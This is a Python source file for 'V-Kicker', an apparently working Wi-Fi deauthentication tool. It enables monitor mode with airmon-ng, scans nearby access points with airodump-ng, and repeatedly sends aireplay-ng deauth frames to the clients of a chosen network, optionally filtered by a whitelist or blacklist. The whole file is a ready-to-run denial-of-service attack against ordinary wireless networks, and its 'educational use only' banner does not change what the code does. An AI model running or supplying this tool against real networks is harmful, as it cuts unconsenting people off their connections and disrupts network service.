import curses
import datetime
import os
import signal
import subprocess
import sys
from threading import Thread
import time

# ---[ CLASSES ]--- #

class Adapter:
  def __init__(self, name, is_monitor):
    self.name = name
    self.is_monitor = is_monitor

class Network:
    def __init__(self, bssid, channel, power, essid):
        self.bssid = bssid
        self.channel = channel
        self.power = power
        self.essid = essid

class Client:
  def __init__(self, mac):
    self.mac = mac

# ---[ GLOBAL VARIABLES ]--- #

__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))

# List of Adapter objects
adapters = []

# Adapters
original_adapter = None
choosen_adapter = None

# List of Network objects
networks = []

# Choosen network
choosen_network = None

# Choosen mode
choosen_mode = None

# List of Client objects
clients = []
white_listed = []
black_listed = []

# ---[ MANAGEMENT ]--- #

def is_root():
    return os.geteuid() == 0

def show_error(message):
    print("[x]: " + message)

def show_message(message):
    print("[!]: " + message)

def show_time(message):
    now = datetime.datetime.now()
    print(f"[{now.hour:02d}:{now.minute:02d}:{now.second:02d}]: {message}")

def show_question(msg):
    return input("[?]: " + msg + " ")

def has_monitor_adapter():
    for adapter in adapters:
        if adapter.is_monitor:
            return adapter
    
    return None
     
# ---[ STEPS ]--- #

def reset_variables():
    for fname in os.listdir(__location__):
        if fname.startswith("tmp_"):
            os.remove(os.path.join(__location__, fname))

    adapters.clear()
    networks.clear()

def show_header():                      
    print("                                                                            ")
    print("                                 *@@@@@@(                                   ")
    print("                        %@@@@@@@@@@@@@                                      ")
    print("                   @@@@@@@@@@@@@@@@                                         ")
    print("                @@@@@@@@@@@@@@@@                      @@@@@@(               ")
    print("             .@@@@@@@@@@@@@@@&                   *@@@@@@@@@@@@@             ")
    print("            @@@@@@@@@@@@@@@                  @@@@@@@@@@@@@@@@@@@            ")
    print("           @@@@@@@@@@@@@       #@                  %@@@@@@@@@@@@@           ")
    print("           @@@@@@@@@@@@@@@@@@                (@@@@@@@@@@@@@@@@@@@           ")
    print("           @@@@@@@@@@@@@@@             *@@@@@@@@@@@@@@@@@@@@@@@@@           ")
    print("           @@@@@@@@@@@           *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@           ")
    print("            @@@@@@,         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.           ")
    print("            %@@      ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            ")
    print("                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@             ")
    print("              @@@@@@&*   ./&@@@@@@@@@@@@@@@@@@@@@(.   ,#@@@@@@              ")
    print("              @@@@@         (@@@@@@@@@@@@@@@@@@@         ,@@@@              ")
    print("              @@@@@              @@@@@@@@@@               /@@@@              ")
    print("              @@@@@               @@@@@@@@               @@@@@              ")
    print("              @@@@@@             @@@@@@@@@@%            @@@@@@(             ")
    print("              @@@@@@@@       @@@@@@@@@@@@@@@@@@       @@@@@@@@&             ")
    print("              @@@@@@@@@@@@@@@@@@@@@@,   @@@@@@@@@@@@@@@@@@@@@@%             ")
    print("              @@@@@@@@@@@@@@@@@@@@*       @@@@@@@@@@@@@@@@@@@@              ")
    print("               @@@@@@@@@@@@@@@@@@@/   @   @@@@@@@@@@@@@@@@@@@               ")
    print("                 .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 ")
    print("                     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     ")
    print("                          @@@@@@@@@@@@@@@@@@@@@@@@.                         ")
    print("                           @@@@@@@@@@@@@@@@@@@@@@                           ")
    print("                             @  @@@(@@@@(@@@  @@                            ")
    print("                                 @   (@   @                                 ")
    print("                                                                            ")
    print("                                                                            ")
    print("                             ++++++++++++++++++                             ")
    print("                                  V-Kicker                                  ")
    print("                             ++++++++++++++++++                             ")
    print("                                                                            ")
    print("  Educational use only. Use this tool only with everyone involved consent.  ")
    print("                                                                            ")

def check_dependencies():
    if (is_root() == False):
        show_error("Run this script with sudo to continue.")
        sys.exit(1)

def find_adapters():
    show_message("Searching for adapters.")

    adapters.clear()

    cmd = subprocess.run("ifconfig | grep wlan", shell = True, stdout = subprocess.PIPE)
    
    try:
        lines = cmd.stdout.decode("utf8").splitlines()
    except:
        show_error("Error while getting wlan adapters.")
        sys.exit(1)

    if len(lines) == 0:
        show_error("No wlan interfaces found.")
        sys.exit(1)
        
    for line in lines:
        iStart = line.find("wlan")
        iEnd = line.find(":")
        interface = line[iStart:iEnd - iStart]

        adapter = Adapter(interface, "mon" in line)
        adapters.append(adapter)

def choose_adapter():
    global choosen_adapter

    if has_monitor_adapter() != None:
        choosen_adapter = has_monitor_adapter()
    elif len(adapters) == 1:
        choosen_adapter = adapters[0]
    elif len(adapters) == 0:
        show_error("No adapters found.")
    else:
        show_message("Available adapters:")
        print("")

        for i, adapter in enumerate(adapters):
            print(" " + str(i) + ") " + adapter.name)

        print("")

        # TODO: check for int()
        iAdapter = int(show_question("Which adapter do you want to use?"))
        choosen_adapter = adapters[iAdapter]
    
    show_message("Adapter " + choosen_adapter.name + " choosen.")

def airmon_check_kill():
    show_message("Killing processes that uses " + choosen_adapter.name + " adapter.")
    cmd = subprocess.run("airmon-ng check kill", shell = True, stdout = subprocess.PIPE)

    if cmd.returncode != 0:
        show_error("Error while killing processes.")
        sys.exit(1)

def enable_monitor_mode():
    show_message("Enabling monitor mode for " + choosen_adapter.name + " adapter.")

    global original_adapter
    original_adapter = Adapter(choosen_adapter.name, choosen_adapter.is_monitor)

    cmd = subprocess.run("airmon-ng start " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE)

    if cmd.returncode != 0:
        show_error("Error while enabling monitor mode.")
        sys.exit(1)

    show_message("Monitor mode enabled for " + choosen_adapter.name + " adapter.")

def scan_access_points():
    show_message("Scanning access points using " + choosen_adapter.name + " adapter.")

    # Launch network scan process
    proc_network_scan = subprocess.Popen("airodump-ng " + choosen_adapter.name + " --write tmp_networks --update 1 --output-format csv --write-interval 1", shell = True, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)

    # Set out file timeout to 10 seconds
    for i in range(0, 10):
        if os.path.exists(os.path.join(__location__, 'tmp_networks-01.csv')) == False:
            time.sleep(1)
            continue
        else:
            break

    if os.path.exists(os.path.join(__location__, 'tmp_networks-01.csv')) == False:
        show_error("Unable to obtain networks after 10 attempts.")
        sys.exit(1)

    try:
        stdscr = curses.initscr()
        curses.noecho()
        curses.cbreak()

        while True:
            with open(os.path.join(__location__, 'tmp_networks-01.csv')) as file:
                lines = [line.rstrip() for line in file]

                if len(lines) <= 0:
                    time.sleep(1)
                    continue
        
                i_start = -1
                i_end = -1

                # Find start and end
                for i, line in enumerate(lines):
                    if "BSSID" in line and i_start == -1:
                        i_start = i + 1
                    
                    if "Station MAC" in line and i_end == -1:
                        i_end = i - 1

                # Check if has found something
                if i_start < 0 or i_end < 0:
                    show_error("Unable to parse the file")
                    sys.exit(1)

                # Clear all networks
                networks.clear()

                # Get networks
                for raw_network in lines[i_start : i_end]:
                    network = raw_network.split(",")

                    bssid = network[0].strip()
                    channel = network[3].strip()
                    power = network[8].strip()
                    essid = network[13].strip()

                    n = Network(bssid, channel, power, essid)
                    networks.append(n)    
                
                # Print networks
                try:
                    stdscr.addstr(0, 0, "[!] Available networks:")
                    stdscr.addstr(1, 0, " ")

                    for i, network in enumerate(networks):
                        stdscr.addstr(i + 2, 0, "==> [" + network.bssid + "] - " + network.essid + " - CH" + network.channel + " - PW" + network.power)

                    stdscr.addstr(len(networks) + 2, 0, " ")
                    stdscr.addstr(len(networks) + 3, 0, "[!] Use CTRL + C to stop scanning.")
                except Exception as e:
                    show_error("Exception " + e)

                stdscr.refresh()
                time.sleep(1)

    except KeyboardInterrupt:
        curses.echo()
        curses.nocbreak()
        curses.endwin()

        os.kill(proc_network_scan.pid, signal.SIGKILL)

        show_message("Available networks:")
        print(" ")

        for i, network in enumerate(networks):
            print(" " + str(i) + ") [" + network.bssid + "] - CH" + network.channel + " - PW" + network.power + " - " + network.essid)
        
        print(" ")

        choosen_i_network = show_question("Choose a network:")

        global choosen_network
        choosen_network = networks[int(choosen_i_network)]

        show_message("Network " + choosen_network.essid + " choosen.")

def choose_mode():
    show_message("Available modes:")
    print(" ")
    print(" 0) Whitelist only.")
    print(" 1) Blacklist kicker.")
    print(" 2) All clients.")
    print(" ")

    global choosen_mode
    choosen_mode = show_question("Which mode do you want to use?")

def kicker():
    show_message("Initializing kicker.")
    print("")

    # Launch client scan process
    proc_client_scan = subprocess.Popen("airodump-ng --channel " + choosen_network.channel + " --bssid " + choosen_network.bssid + " " + choosen_adapter.name + " --write tmp_clients --update 1 --output-format csv --write-interval 1", shell = True, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)

    # Set out file timeout to 10 seconds
    for i in range(0, 10):
        if os.path.exists(os.path.join(__location__, 'tmp_clients-01.csv')) == False:
            time.sleep(1)
            continue
        else:
            break

    if os.path.exists(os.path.join(__location__, 'tmp_clients-01.csv')) == False:
        show_error("Unable to obtain clients after 10 attempts.")
        sys.exit(1)

    # Whitelist
    if choosen_mode == "0" and os.path.exists(os.path.join(__location__, '_WHITELIST.txt')):
        with open(os.path.join(__location__, '_WHITELIST.txt')) as file:
            lines = [line.rstrip() for line in file]
            
            for line in lines:
                if line.startswith("#") or line.strip() == "":
                    continue
                    
                white_listed.append(line.strip())

                show_message(line.strip() + " added to whitelist.")
    # Blacklist
    elif choosen_mode == "1" and os.path.exists(os.path.join(__location__, '_BLACKLIST.txt')):
        with open(os.path.join(__location__, '_BLACKLIST.txt')) as file:
            lines = [line.rstrip() for line in file]
            
            for line in lines:
                if line.startswith("#") or line.strip() == "":
                    continue
                    
                black_listed.append(line.strip())

                show_message(line.strip() + " added to blacklist.")
    try:
        while True:
            with open(os.path.join(__location__, 'tmp_clients-01.csv')) as file:
                lines = [line.rstrip() for line in file]

                if len(lines) <= 0:
                    time.sleep(1)
                    continue
        
                i_start = -1

                # Find start and end
                for i, line in enumerate(lines):
                    if "Station MAC" in line:
                        i_start = i + 1
                        break

                # Check if has found something
                if i_start < 0:
                    show_error("Unable to parse the file")
                    sys.exit(1)

                # Clear all clients
                clients.clear()

                # Get networks
                for raw_client in lines[i_start:]:
                    if raw_client.strip() == "":
                        continue

                    splitted_client = raw_client.split(",")
                    mac = splitted_client[0].strip()
                    c = Client(mac)
                    clients.append(c)    
                    
                # Do magic
                for splitted_client in clients:
                    if choosen_mode == "0" and splitted_client.mac in white_listed:
                        show_time("Ignoring " + splitted_client.mac + " thanks to whitelist.")
                    elif choosen_mode == "1" and splitted_client.mac in black_listed:
                        subprocess.Popen("aireplay-ng --deauth 10 -a " + choosen_network.bssid + " -c " + splitted_client.mac + " " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
                        show_time("Sent deauth to " + splitted_client.mac + " thanks to blacklist.")
                    else:
                        subprocess.Popen("aireplay-ng --deauth 10 -a " + choosen_network.bssid + " -c " + splitted_client.mac + " " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
                        show_time("Sent deauth to " + splitted_client.mac + ".")

                show_time("Press CTRL + C anytime to quit.")
                time.sleep(1)

    except KeyboardInterrupt:
        os.kill(proc_client_scan.pid, signal.SIGKILL)
        show_message("Kicker successfully disabled.")

def disable_monitor_mode():
    show_message("Disabling monitor mode for " + choosen_adapter.name + " adapter.")
    cmd = subprocess.run("airmon-ng stop " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE)

    if cmd.returncode != 0:
        show_error("Error while enabling monitor mode.")
        sys.exit(1)

    show_message("Monitor mode disabled for " + choosen_adapter.name + " adapter.")

def restore_network_manager():
    show_message("Re-establishing the network for " + original_adapter.name + " adapter.")
    subprocess.run("ifconfig " + original_adapter.name + " up", shell = True, stdout = subprocess.PIPE)
    subprocess.run("service NetworkManager restart", shell = True, stdout = subprocess.PIPE)


# ---[ MAIN ]--- #

if __name__ == "__main__":
    reset_variables()
    show_header()
    check_dependencies()
    find_adapters()

    if has_monitor_adapter() == None:
        choose_adapter()
        airmon_check_kill()
        enable_monitor_mode()
        find_adapters()
        
    choose_adapter()
    scan_access_points()
    choose_mode()
    kicker()
    reset_variables()
    disable_monitor_mode()
    restore_network_manager()
